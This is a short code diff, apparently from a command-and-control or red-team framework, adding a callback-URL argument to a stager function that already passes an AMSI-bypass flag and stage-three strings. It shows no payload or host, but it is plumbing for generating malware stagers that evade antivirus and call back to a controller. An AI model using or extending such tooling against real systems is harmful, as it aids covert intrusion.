@@ -83,6 +83,7 @@ def stager():
 
     result = get_stage(
         ph_app.key,
+        callback=callback_urls[transport],
         amsi_bypass=amsi_bypass,
         stage3_strings=[stage3, profile, exec_clipboard_entry],
     )
